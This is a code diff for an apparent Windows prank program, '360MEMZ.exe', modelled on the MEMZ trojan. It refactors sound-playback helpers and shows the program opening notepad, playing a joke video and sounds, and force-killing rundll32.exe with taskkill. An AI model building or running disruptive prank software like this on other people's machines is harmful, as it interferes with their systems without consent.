@@ -14,7 +14,7 @@ extern int lasteffect;
 int random() {
 	if (prov == NULL)
 		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)){
-                        MessageBox(NULL, L"应用程序在初始化 Crypto API 时发生了一些奇妙的错误。", L"360MEMZ.exe - 应用程序错误", MB_ICONERROR);
+                        MessageBox(NULL, L"应用程序在初始化 Crypto API 时发生了一些错误。", L"360MEMZ.exe - 应用程序错误", MB_ICONERROR);
 			ExitProcess(1);
                 }
 	int out;
@@ -28,8 +28,8 @@ void write(){
 	ShellExecuteA(NULL, NULL, "notepad", "tips.txt", NULL, SW_SHOWDEFAULT);
 }
 
-MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type) {
-	LPWSTR inserts[] = { path, alias, type };
+MCIERROR openSound(const char * path, const char * alias, const char * type) {
+	const char * inserts[] = { path, alias, type };
 
 	LPWSTR cmd;
 	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
@@ -40,17 +40,17 @@ MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type) {
 	return err;
 }
 
-MCIERROR resetSound(LPWSTR alias) {
+MCIERROR resetSound(const char * alias) {
 	MCI_SEEK_PARMS params;
 	memset(&params, 0, sizeof(params));
-	return mciSendCommand(mciGetDeviceID(alias), MCI_SEEK, MCI_SEEK_TO_START, (DWORD)&params);
+	return mciSendCommand(mciGetDeviceID(LP(alias)), MCI_SEEK, MCI_SEEK_TO_START, (DWORD_PTR)(&params));
 }
 
-MCIERROR playSound(LPWSTR alias, BOOL async) {
+MCIERROR playSound(const char * alias, BOOL async) {
 	MCIERROR err = resetSound(alias);
 	if (err) return err;
 
-	LPCWSTR inserts[] = { alias, async ? L"" : L" wait" };
+	const char * inserts[] = { alias, async ? "" : " wait" };
 
 	LPWSTR cmd;
 	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
@@ -61,7 +61,7 @@ MCIERROR playSound(LPWSTR alias, BOOL async) {
 	return err;
 }
 
-MCIERROR playSound(LPWSTR alias, LPWSTR type, LPWSTR path, BOOL async) {
+MCIERROR playSound(const char * alias, const char * type, const char * path, BOOL async) {
 	MCIERROR err;
 
 	if (playSound(alias, async)) {
@@ -75,11 +75,11 @@ MCIERROR playSound(LPWSTR alias, LPWSTR type, LPWSTR path, BOOL async) {
 	return 0;
 }
 
-MCIERROR stopSound(LPWSTR alias) {
+MCIERROR stopSound(const char * alias) {
 	MCIERROR err = resetSound(alias);
 	if (err) return err;
 
-	LPWSTR inserts[] = { alias };
+	const char * inserts[] = { alias };
 
 	LPWSTR cmd;
 	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
@@ -90,8 +90,8 @@ MCIERROR stopSound(LPWSTR alias) {
 	return err;
 }
 
-MCIERROR playSound(LPWSTR alias, LPWSTR path, BOOL async) {
-	return playSound(alias, L"mpegvideo", path, async);
+MCIERROR playSound(const char * alias, const char * path, BOOL async) {
+	return playSound(alias, "mpegvideo", path, async);
 }
 
 
@@ -129,6 +129,7 @@ DWORD WINAPI VideoThread(LPVOID lpParameter){
     mciSendStringA("Play 360MEMZJokeVideo", message, 100, 0);
     Sleep(20000);
     mciSendStringA("Pause 360MEMZJokeVideo", "", 0, 0);
+	return 0;
 }
 
 int main(){
@@ -142,7 +143,7 @@ int main(){
 	Sleep(2000);
 	LPSTR lpCurrentPath = (LPSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH);
 	GetModuleFileNameA(NULL, lpCurrentPath, MAX_PATH);
-	playSound(L"button", L"1.data", TRUE); // buttercup.wav
+	playSound("button", "1.data", TRUE); // buttercup.wav
 	
 	*(strrchr(lpCurrentPath, '\\')) = 0;
 	
@@ -192,7 +193,7 @@ int main(){
 	Sleep(40000);
 	
 	system("taskkill /f /im rundll32.exe");
-	playSound(L"360MEMZ", L"2.data", TRUE); // intro.wav
+	playSound("360MEMZ", "2.data", TRUE); // intro.wav
 	Sleep(8000);
 	
 	
